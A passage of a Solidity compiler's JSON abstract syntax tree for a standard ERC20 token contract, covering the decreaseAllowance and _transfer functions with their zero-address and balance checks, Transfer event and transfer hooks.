															"arguments": [
																{
																	"id": 258,
																	"name": "owner",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 239,
																	"src": "6912:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																{
																	"id": 259,
																	"name": "spender",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 231,
																	"src": "6919:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 262,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"id": 260,
																		"name": "currentAllowance",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 244,
																		"src": "6928:16:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"id": 261,
																		"name": "subtractedValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 233,
																		"src": "6947:15:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "6928:34:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	},
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	},
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 257,
																"name": "_approve",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 520,
																"src": "6903:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
																	"typeString": "function (address,address,uint256)"
																}
															},
															"id": 263,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6903:60:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$__$",
																"typeString": "tuple()"
															}
														},
														"id": 264,
														"nodeType": "ExpressionStatement",
														"src": "6903:60:0"
													}
												]
											},
											{
												"expression": {
													"hexValue": "74727565",
													"id": 266,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "6991:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 237,
												"id": 267,
												"nodeType": "Return",
												"src": "6984:11:0"
											}
										]
									},
									"documentation": {
										"id": 229,
										"nodeType": "StructuredDocumentation",
										"src": "6094:476:0",
										"text": " @dev Atomically decreases the allowance granted to `spender` by the caller.\n This is an alternative to {approve} that can be used as a mitigation for\n problems described in {IERC20-approve}.\n Emits an {Approval} event indicating the updated allowance.\n Requirements:\n - `spender` cannot be the zero address.\n - `spender` must have allowance for the caller of at least\n `subtractedValue`."
									},
									"functionSelector": "a457c2d7",
									"id": 269,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "decreaseAllowance",
									"nameLocation": "6584:17:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 234,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 231,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "6610:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 269,
												"src": "6602:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 230,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "6602:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 233,
												"mutability": "mutable",
												"name": "subtractedValue",
												"nameLocation": "6627:15:0",
												"nodeType": "VariableDeclaration",
												"scope": 269,
												"src": "6619:23:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 232,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6619:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "6601:42:0"
									},
									"returnParameters": {
										"id": 237,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 236,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 269,
												"src": "6668:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 235,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "6668:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "6667:6:0"
									},
									"scope": 586,
									"src": "6575:427:0",
									"stateMutability": "nonpayable",
									"virtual": true,
									"visibility": "public"
								},
								{
									"body": {
										"id": 345,
										"nodeType": "Block",
										"src": "7534:710:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 285,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 280,
																"name": "from",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 272,
																"src": "7552:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"arguments": [
																	{
																		"hexValue": "30",
																		"id": 283,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7568:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		}
																	],
																	"id": 282,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "7560:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 281,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "7560:7:0",
																		"typeDescriptions": {}
																	}
																},
																"id": 284,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "7560:10:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "7552:18:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "45524332303a207472616e736665722066726f6d20746865207a65726f2061646472657373",
															"id": 286,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "7572:39:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_baecc556b46f4ed0f2b4cb599d60785ac8563dd2dc0a5bf12edea1c39e5e1fea",
																"typeString": "literal_string \"ERC20: transfer from the zero address\""
															},
															"value": "ERC20: transfer from the zero address"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_baecc556b46f4ed0f2b4cb599d60785ac8563dd2dc0a5bf12edea1c39e5e1fea",
																"typeString": "literal_string \"ERC20: transfer from the zero address\""
															}
														],
														"id": 279,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "7544:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 287,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7544:68:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 288,
												"nodeType": "ExpressionStatement",
												"src": "7544:68:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 295,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 290,
																"name": "to",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 274,
																"src": "7630:2:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"arguments": [
																	{
																		"hexValue": "30",
																		"id": 293,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7644:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		}
																	],
																	"id": 292,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "7636:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 291,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "7636:7:0",
																		"typeDescriptions": {}
																	}
																},
																"id": 294,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "7636:10:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "7630:16:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "45524332303a207472616e7366657220746f20746865207a65726f2061646472657373",
															"id": 296,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "7648:37:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_0557e210f7a69a685100a7e4e3d0a7024c546085cee28910fd17d0b081d9516f",
																"typeString": "literal_string \"ERC20: transfer to the zero address\""
															},
															"value": "ERC20: transfer to the zero address"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_0557e210f7a69a685100a7e4e3d0a7024c546085cee28910fd17d0b081d9516f",
																"typeString": "literal_string \"ERC20: transfer to the zero address\""
															}
														],
														"id": 289,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "7622:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 297,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7622:64:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 298,
												"nodeType": "ExpressionStatement",
												"src": "7622:64:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 300,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 272,
															"src": "7718:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 301,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 274,
															"src": "7724:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 302,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 276,
															"src": "7728:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 299,
														"name": "_beforeTokenTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 574,
														"src": "7697:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 303,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7697:38:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 304,
												"nodeType": "ExpressionStatement",
												"src": "7697:38:0"
											},
											{
												"assignments": [
													306
												],
												"declarations": [
													{
														"constant": false,
														"id": 306,
														"mutability": "mutable",
														"name": "fromBalance",
														"nameLocation": "7754:11:0",
														"nodeType": "VariableDeclaration",
														"scope": 345,
														"src": "7746:19:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 305,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "7746:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 310,
												"initialValue": {
													"baseExpression": {
														"id": 307,
														"name": "_balances",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 15,
														"src": "7768:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 309,
													"indexExpression": {
														"id": 308,
														"name": "from",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 272,
														"src": "7778:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "7768:15:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7746:37:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 314,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 312,
																"name": "fromBalance",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 306,
																"src": "7801:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"id": 313,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 276,
																"src": "7816:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "7801:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "45524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e6365",
															"id": 315,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "7824:40:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_4107e8a8b9e94bf8ff83080ddec1c0bffe897ebc2241b89d44f66b3d274088b6",
																"typeString": "literal_string \"ERC20: transfer amount exceeds balance\""
															},
															"value": "ERC20: transfer amount exceeds balance"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_4107e8a8b9e94bf8ff83080ddec1c0bffe897ebc2241b89d44f66b3d274088b6",
																"typeString": "literal_string \"ERC20: transfer amount exceeds balance\""
															}
														],
														"id": 311,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "7793:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 316,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7793:72:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 317,
												"nodeType": "ExpressionStatement",
												"src": "7793:72:0"
											},
											{
												"id": 332,
												"nodeType": "UncheckedBlock",
												"src": "7875:273:0",
												"statements": [
													{
														"expression": {
															"id": 324,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftHandSide": {
																"baseExpression": {
																	"id": 318,
																	"name": "_balances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 15,
																	"src": "7899:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 320,
																"indexExpression": {
																	"id": 319,
																	"name": "from",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 272,
																	"src": "7909:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": true,
																"nodeType": "IndexAccess",
																"src": "7899:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "Assignment",
															"operator": "=",
															"rightHandSide": {
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 323,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"id": 321,
																	"name": "fromBalance",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 306,
																	"src": "7917:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "-",
																"rightExpression": {
																	"id": 322,
																	"name": "amount",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 276,
																	"src": "7931:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7917:20:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "7899:38:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 325,
														"nodeType": "ExpressionStatement",
														"src": "7899:38:0"
													},
													{
														"expression": {
															"id": 330,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftHandSide": {
																"baseExpression": {
																	"id": 326,
																	"name": "_balances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 15,
																	"src": "8114:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 328,
																"indexExpression": {
																	"id": 327,
																	"name": "to",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 274,
																	"src": "8124:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": true,
																"nodeType": "IndexAccess",
																"src": "8114:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "Assignment",
															"operator": "+=",
															"rightHandSide": {
																"id": 329,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 276,
																"src": "8131:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "8114:23:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 331,
														"nodeType": "ExpressionStatement",
														"src": "8114:23:0"
													}
												]
											},
											{
												"eventCall": {
													"arguments": [
														{
															"id": 334,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 272,
															"src": "8172:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 335,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 274,
															"src": "8178:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 336,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 276,
															"src": "8182:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 333,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 598,
														"src": "8163:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 337,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8163:26:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 338,
												"nodeType": "EmitStatement",
												"src": "8158:31:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 340,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 272,
															"src": "8220:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 341,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 274,
															"src": "8226:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 342,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 276,
															"src": "8230:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 339,
														"name": "_afterTokenTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 585,
														"src": "8200:19:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 343,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8200:37:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 344,
												"nodeType": "ExpressionStatement",
												"src": "8200:37:0"
											}
										]
									},
									"documentation": {
										"id": 270,
										"nodeType": "StructuredDocumentation",
										"src": "7008:443:0",
										"text": " @dev Moves `amount` of tokens from `from` to `to`.\n This internal function is equivalent to {transfer}, and can be used to\n e.g. implement automatic token fees, slashing mechanisms, etc.\n Emits a {Transfer} event.\n Requirements:\n - `from` cannot be the zero address.\n - `to` cannot be the zero address.\n - `from` must have a balance of at least `amount`."
									},
									"id": 346,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_transfer",
									"nameLocation": "7465:9:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 277,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 272,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "7483:4:0",
												"nodeType": "VariableDeclaration",
												"scope": 346,
												"src": "7475:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 271,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "7475:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 274,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "7497:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 346,
												"src": "7489:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 273,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "7489:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 276,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "7509:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 346,
												"src": "7501:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 275,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "7501:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "7474:42:0"
									},
									"returnParameters": {
										"id": 278,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7534:0:0"
									},
									"scope": 586,
									"src": "7456:788:0",
									"stateMutability": "nonpayable",
									"virtual": true,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 402,
										"nodeType": "Block",
										"src": "8585:470:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 360,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 355,
																"name": "account",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 349,
																"src": "8603:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"arguments": [
																	{
																		"hexValue": "30",
																		"id": 358,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "8622:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
